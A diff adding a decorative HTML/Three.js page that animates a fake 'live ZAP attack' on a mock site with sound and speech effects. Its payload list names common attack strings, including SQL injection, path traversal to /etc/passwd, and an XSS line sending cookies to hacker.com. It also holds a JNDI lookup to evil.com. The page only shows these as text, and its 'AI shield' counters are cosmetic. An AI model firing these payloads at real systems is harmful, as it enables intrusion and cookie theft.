@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Threat Simulation | PixelCraft AI Command Center</title>
+    
+    <!-- External Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <!-- Three.js Post Processing -->
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/postprocessing/EffectComposer.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/postprocessing/RenderPass.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/postprocessing/ShaderPass.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/shaders/CopyShader.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/shaders/LuminosityHighPassShader.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/postprocessing/UnrealBloomPass.js"></script>
+
+    <style>
+        :root {
+            --bg-color: #030305;
+            --neon-blue: #00f2fe;
+            --neon-red: #ff3366;
+            --neon-green: #10b981;
+            --matrix-green: #0f0;
+            --panel-bg: rgba(5, 5, 10, 0.7);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: white;
+            overflow: hidden;
+            perspective: 1000px;
+        }
+
+        #webgl-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        /* Scanline Overlay (CRT Effect) */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(
+                rgba(18, 16, 16, 0) 50%, 
+                rgba(0, 0, 0, 0.25) 50%), 
+                linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 4px, 6px 100%;
+            z-index: 9998;
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        /* Glitch Animation Classes */
+        .glitch-severe {
+            animation: severeGlitch 0.3s cubic-bezier(.25, .46, .45, .94) both infinite;
+            filter: drop-shadow(5px 0 0 red) drop-shadow(-5px 0 0 cyan);
+        }
+
+        @keyframes severeGlitch {
+            0% { transform: translate(0) }
+            20% { transform: translate(-5px, 5px) }
+            40% { transform: translate(-5px, -5px) }
+            60% { transform: translate(5px, 5px) }
+            80% { transform: translate(5px, -5px) }
+            100% { transform: translate(0) }
+        }
+
+        /* UI Overlay Layer */
+        #ui-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            pointer-events: none; /* Let clicks pass through to 3D scene where needed */
+            transition: transform 0.1s ease-out; /* For Parallax */
+        }
+
+        /* Panels */
+        .panel {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            border-radius: 8px;
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            pointer-events: auto;
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.1);
+        }
+
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--neon-blue);
+            padding-bottom: 10px;
+            text-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        header h1 {
+            font-size: 24px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .status-badge {
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            text-shadow: 0 0 5px var(--neon-green);
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.3);
+        }
+
+        /* Terminal Window */
+        #terminal {
+            width: 400px;
+            height: 350px;
+            overflow-y: hidden;
+            font-size: 12px;
+            line-height: 1.5;
+            color: var(--matrix-green);
+            text-shadow: 0 0 5px var(--matrix-green);
+            position: absolute;
+            bottom: 30px;
+            left: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+        
+        .term-line {
+            opacity: 0.8;
+            margin-bottom: 4px;
+            word-break: break-all;
+        }
+        .term-critical { color: var(--neon-red); text-shadow: 0 0 8px var(--neon-red); font-weight: bold; }
+        .term-shield { color: var(--neon-blue); text-shadow: 0 0 8px var(--neon-blue); }
+
+        /* DOM Destruction Preview */
+        #dom-preview {
+            width: 350px;
+            height: 250px;
+            position: absolute;
+            bottom: 30px;
+            right: 30px;
+            background: #fff;
+            color: #000;
+            font-family: sans-serif;
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+        
+        .mock-header { background: #333; color: white; padding: 10px; font-weight: bold;}
+        .mock-content { padding: 15px; }
+        .mock-btn { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 4px; margin-top: 10px;}
+        
+        .dom-hacked {
+            background: #ff0000 !important;
+            color: #fff !important;
+            transform: skewX(-10deg) scale(1.05);
+            filter: invert(1);
+        }
+
+        /* Interactive Controls */
+        #controls {
+            position: absolute;
+            top: 100px;
+            right: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        button.cyber-btn {
+            background: transparent;
+            color: var(--neon-blue);
+            border: 2px solid var(--neon-blue);
+            padding: 12px 25px;
+            font-size: 16px;
+            text-transform: uppercase;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s;
+            text-shadow: 0 0 8px var(--neon-blue);
+            box-shadow: inset 0 0 10px rgba(0, 242, 254, 0.2), 0 0 15px rgba(0, 242, 254, 0.4);
+            pointer-events: auto;
+        }
+        
+        button.cyber-btn:hover {
+            background: var(--neon-blue);
+            color: #000;
+            box-shadow: 0 0 30px var(--neon-blue);
+        }
+
+        button.cyber-btn.shield {
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            text-shadow: 0 0 8px var(--neon-green);
+            box-shadow: inset 0 0 10px rgba(16, 185, 129, 0.2), 0 0 15px rgba(16, 185, 129, 0.4);
+        }
+        button.cyber-btn.shield:hover { background: var(--neon-green); color: #000; }
+
+        /* Stats */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+            position: absolute;
+            top: 80px;
+            left: 30px;
+        }
+        
+        .stat-box {
+            text-align: center;
+        }
+        .stat-val { font-size: 32px; font-weight: bold; color: white; text-shadow: 0 0 10px white; }
+        .stat-label { font-size: 12px; color: var(--neon-blue); opacity: 0.8; }
+        
+        /* Initialization Screen */
+        #init-screen {
+            position: fixed;
+            top:0; left:0; width: 100vw; height: 100vh;
+            background: #000;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: var(--neon-blue);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="scanlines"></div>
+
+    <!-- Initialization Screen (For Audio Context) -->
+    <div id="init-screen">
+        <h1 style="text-shadow: 0 0 20px var(--neon-blue); margin-bottom: 30px;">PIXELCRAFT AI COMMAND CENTER</h1>
+        <button class="cyber-btn" onclick="initializeSimulation()">ENGAGE SIMULATION</button>
+        <p style="margin-top:20px; font-size:12px; opacity:0.6;">Warning: Flashing lights and loud audio</p>
+    </div>
+
+    <!-- 3D Scene Container -->
+    <div id="webgl-container"></div>
+
+    <!-- UI Layer -->
+    <div id="ui-layer" style="display:none;">
+        <header>
+            <h1>LIVE ZAP ATTACK SIMULATION</h1>
+            <div class="status-badge" id="system-status">SYSTEM: DEFENDING</div>
+        </header>
+
+        <div class="stats-grid">
+            <div class="panel stat-box">
+                <div class="stat-val" id="stat-req">0</div>
+                <div class="stat-label">PAYLOADS INJECTED</div>
+            </div>
+            <div class="panel stat-box" style="border-color: var(--neon-red);">
+                <div class="stat-val" id="stat-crit" style="color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red);">0</div>
+                <div class="stat-label" style="color: var(--neon-red);">CRITICAL HITS</div>
+            </div>
+            <div class="panel stat-box" style="border-color: var(--neon-green);">
+                <div class="stat-val" id="stat-block" style="color: var(--neon-green); text-shadow: 0 0 10px var(--neon-green);">0</div>
+                <div class="stat-label" style="color: var(--neon-green);">THREATS NEUTRALIZED</div>
+            </div>
+        </div>
+
+        <div id="controls">
+            <button class="cyber-btn shield" onclick="deployManualShield()">DEPLOY AI SHIELD</button>
+            <button class="cyber-btn" onclick="triggerDDoS()" style="border-color: var(--neon-red); color: var(--neon-red);">SIMULATE DDOS SWARM</button>
+        </div>
+
+        <div class="panel" id="terminal">
+            <div style="border-bottom: 1px solid rgba(0,255,0,0.3); padding-bottom: 5px; margin-bottom: 10px; font-weight: bold;">ZAP_PAYLOAD_MATRIX_v0.12.0</div>
+            <div id="terminal-content"></div>
+        </div>
+
+        <div class="panel" id="dom-preview" style="padding:0;">
+            <div class="mock-header">Target Application (Live DOM)</div>
+            <div class="mock-content" id="mock-dom-body">
+                <h2>Welcome to PixelCraft</h2>
+                <p>Your secure AI toolset.</p>
+                <button class="mock-btn">Get Started</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- GLOBAL VARIABLES ---
+        let scene, camera, renderer, composer;
+        let globe, particles;
+        let lasers = [];
+        let audioCtx, synthDrums, droneGain;
+        let payloadsInjected = 0;
+        let criticalHits = 0;
+        let threatsNeutralized = 0;
+        let isSimulationRunning = false;
+        
+        // Payload dictionary
+        const PAYLOAD_TEMPLATES = [
+            "' OR '1'='1", "1; DROP TABLE users", "<script>fetch('http://hacker.com?c='+document.cookie)</script>",
+            "../../../../etc/passwd", "${jndi:ldap://evil.com/a}", "<img src=x onerror=alert('XSS')>",
+            "admin' --", "eval(atob('YWxlcnQoMSk='))", "UNION SELECT username, password FROM admin"
+        ];
+        const IP_PREFIXES = ["192.168", "10.0", "172.16", "45.33", "185.199", "104.21"];
+
+        function getRand(min, max) { return Math.random() * (max - min) + min; }
+
+        // --- WEB AUDIO API & SPEECH ---
+        function initAudio() {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            audioCtx = new AudioContext();
+            
+            // Background Drone
+            const osc = audioCtx.createOscillator();
+            osc.type = 'sawtooth';
+            osc.frequency.value = 55; // Low bass
+            droneGain = audioCtx.createGain();
+            droneGain.gain.value = 0.05;
+            osc.connect(droneGain).connect(audioCtx.destination);
+            osc.start();
+        }
+
+        function playBlip(isCritical = false) {
+            if(!audioCtx) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = isCritical ? 'square' : 'sine';
+            osc.frequency.setValueAtTime(isCritical ? 150 : 800, audioCtx.currentTime);
+            if(isCritical) osc.frequency.exponentialRampToValueAtTime(50, audioCtx.currentTime + 0.3);
+            else osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.1);
+            
+            gain.gain.setValueAtTime(isCritical ? 0.2 : 0.05, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + (isCritical ? 0.3 : 0.1));
+            
+            osc.connect(gain).connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.5);
+        }
+
+        function jarvisSpeak(text) {
+            if('speechSynthesis' in window) {
+                const msg = new SpeechSynthesisUtterance(text);
+                msg.rate = 1.1;
+                msg.pitch = 0.8;
+                // Try to find an English voice
+                const voices = speechSynthesis.getVoices();
+                const engVoice = voices.find(v => v.lang.includes('en') && v.name.includes('Google'));
+                if(engVoice) msg.voice = engVoice;
+                speechSynthesis.speak(msg);
+            }
+        }
+
+        // --- THREE.JS 3D SCENE ---
+        function init3D() {
+            const container = document.getElementById('webgl-container');
+            scene = new THREE.Scene();
+            scene.fog = new THREE.FogExp2(0x000000, 0.002);
+            
+            camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 1, 2000);
+            camera.position.z = 400;
+            camera.position.y = 100;
+            camera.lookAt(0,0,0);
+            
+            renderer = new THREE.WebGLRenderer({ antialias: false });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            container.appendChild(renderer.domElement);
+
+            // POST PROCESSING (Bloom)
+            const renderScene = new THREE.RenderPass(scene, camera);
+            const bloomPass = new THREE.UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.5, 0.4, 0.85);
+            bloomPass.threshold = 0;
+            bloomPass.strength = 1.5; // Neon intensity
+            bloomPass.radius = 0;
+
+            composer = new THREE.EffectComposer(renderer);
+            composer.addPass(renderScene);
+            composer.addPass(bloomPass);
+
+            // The Globe (Target Server)
+            const geometry = new THREE.IcosahedronGeometry(80, 2);
+            const material = new THREE.MeshBasicMaterial({ color: 0x0044ff, wireframe: true, transparent: true, opacity: 0.5 });
+            globe = new THREE.Mesh(geometry, material);
+            scene.add(globe);
+            
+            // Core inside globe
+            const coreGeom = new THREE.SphereGeometry(40, 16, 16);
+            const coreMat = new THREE.MeshBasicMaterial({ color: 0x00f2fe });
+            const core = new THREE.Mesh(coreGeom, coreMat);
+            globe.add(core);
+
+            window.addEventListener('resize', onWindowResize, false);
+            
+            // Head Tracking Parallax via Mouse (Simulated Webcam)
+            document.addEventListener('mousemove', (e) => {
+                const x = (e.clientX / window.innerWidth) * 2 - 1;
+                const y = -(e.clientY / window.innerHeight) * 2 + 1;
+                camera.position.x += (x * 100 - camera.position.x) * 0.05;
+                camera.position.y += (y * 50 + 100 - camera.position.y) * 0.05;
+                camera.lookAt(0,0,0);
+            });
+            
+            animate3D();
+        }
+
+        function createLaser(isCritical = false) {
+            const startDist = 600;
+            const theta = Math.random() * Math.PI * 2;
+            const phi = Math.acos((Math.random() * 2) - 1);
+            const startX = startDist * Math.sin(phi) * Math.cos(theta);
+            const startY = startDist * Math.sin(phi) * Math.sin(theta);
+            const startZ = startDist * Math.cos(phi);
+
+            const points = [];
+            points.push(new THREE.Vector3(startX, startY, startZ));
+            points.push(new THREE.Vector3(startX, startY, startZ)); // End point to be animated
+
+            const geometry = new THREE.BufferGeometry().setFromPoints(points);
+            const material = new THREE.LineBasicMaterial({ color: isCritical ? 0xff0000 : 0x00ff00, linewidth: isCritical ? 4 : 1 });
+            const line = new THREE.Line(geometry, material);
+            scene.add(line);
+            
+            lasers.push({
+                obj: line,
+                start: new THREE.Vector3(startX, startY, startZ),
+                progress: 0,
+                speed: isCritical ? 0.02 : 0.05,
+                critical: isCritical
+            });
+        }
+
+        function animate3D() {
+            requestAnimationFrame(animate3D);
+            globe.rotation.y += 0.005;
+            globe.rotation.x += 0.002;
+
+            // Animate Lasers
+            for(let i = lasers.length - 1; i >= 0; i--) {
+                const l = lasers[i];
+                l.progress += l.speed;
+                if(l.progress >= 1) {
+                    scene.remove(l.obj);
+                    lasers.splice(i, 1);
+                    if(l.critical) triggerGlitch();
+                    playBlip(l.critical);
+                } else {
+                    const positions = l.obj.geometry.attributes.position.array;
+                    // Move end point towards center (0,0,0)
+                    positions[3] = l.start.x * (1 - l.progress);
+                    positions[4] = l.start.y * (1 - l.progress);
+                    positions[5] = l.start.z * (1 - l.progress);
+                    l.obj.geometry.attributes.position.needsUpdate = true;
+                }
+            }
+
+            composer.render();
+        }
+
+        function onWindowResize() {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            composer.setSize(window.innerWidth, window.innerHeight);
+        }
+
+        // --- SIMULATION LOGIC ---
+        function initializeSimulation() {
+            document.getElementById('init-screen').style.display = 'none';
+            document.getElementById('ui-layer').style.display = 'flex';
+            
+            initAudio();
+            init3D();
+            jarvisSpeak("Simulation engaged. Monitoring for ZAP attack vectors.");
+            isSimulationRunning = true;
+            
+            // Main Attack Loop
+            setInterval(() => {
+                if(!isSimulationRunning) return;
+                const isCrit = Math.random() < 0.15; // 15% chance of critical payload
+                generatePayload(isCrit);
+                createLaser(isCrit);
+            }, 800);
+        }
+
+        function generatePayload(isCritical) {
+            payloadsInjected++;
+            document.getElementById('stat-req').innerText = payloadsInjected;
+
+            const ip = IP_PREFIXES[Math.floor(Math.random()*IP_PREFIXES.length)] + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
+            const payload = PAYLOAD_TEMPLATES[Math.floor(Math.random()*PAYLOAD_TEMPLATES.length)];
+            
+            const term = document.getElementById('terminal-content');
+            const line = document.createElement('div');
+            line.className = 'term-line ' + (isCritical ? 'term-critical' : '');
+            line.innerText = `[${new Date().toISOString().split('T')[1].slice(0,-1)}] ${ip} -> ${payload}`;
+            term.appendChild(line);
+            
+            if(term.childNodes.length > 20) term.removeChild(term.firstChild);
+            term.scrollTop = term.scrollHeight;
+
+            if(isCritical) {
+                criticalHits++;
+                document.getElementById('stat-crit').innerText = criticalHits;
+                simulateDOMDestruction();
+                if(criticalHits === 5 || criticalHits === 20) {
+                    jarvisSpeak("Warning. Multiple critical vulnerabilities being exploited.");
+                }
+                // Haptic Feedback
+                if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            }
+        }
+
+        function simulateDOMDestruction() {
+            const preview = document.getElementById('dom-preview');
+            preview.classList.add('dom-hacked');
+            setTimeout(() => {
+                // AI Heals it
+                preview.classList.remove('dom-hacked');
+                threatsNeutralized++;
+                document.getElementById('stat-block').innerText = threatsNeutralized;
+            }, 400);
+        }
+
+        function triggerGlitch() {
+            document.body.classList.add('glitch-severe');
+            // Camera shake
+            camera.position.x += (Math.random() - 0.5) * 50;
+            camera.position.y += (Math.random() - 0.5) * 50;
+            setTimeout(() => {
+                document.body.classList.remove('glitch-severe');
+            }, 200);
+        }
+
+        function deployManualShield() {
+            if(droneGain) {
+                droneGain.gain.setValueAtTime(0.05, audioCtx.currentTime);
+                droneGain.gain.exponentialRampToValueAtTime(0.3, audioCtx.currentTime + 0.1);
+                droneGain.gain.exponentialRampToValueAtTime(0.05, audioCtx.currentTime + 1);
+            }
+            jarvisSpeak("Manual shield deployed. Quarantining sector.");
+            const term = document.getElementById('terminal-content');
+            const line = document.createElement('div');
+            line.className = 'term-line term-shield';
+            line.innerText = `>> AI SHIELD ACTIVATED. INCOMING ATTACKS BLOCKED.`;
+            term.appendChild(line);
+            term.scrollTop = term.scrollHeight;
+            
+            // Visual shield on globe
+            globe.material.color.setHex(0x00ff00);
+            globe.scale.set(1.5, 1.5, 1.5);
+            setTimeout(() => {
+                globe.material.color.setHex(0x0044ff);
+                globe.scale.set(1, 1, 1);
+            }, 1000);
+        }
+
+        function triggerDDoS() {
+            jarvisSpeak("Massive DDOS swarm detected. Brace for impact.");
+            if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+            for(let i=0; i<50; i++) {
+                setTimeout(() => {
+                    createLaser(false);
+                    generatePayload(false);
+                }, i * 50);
+            }
+        }
+    </script>
+</body>
+</html>
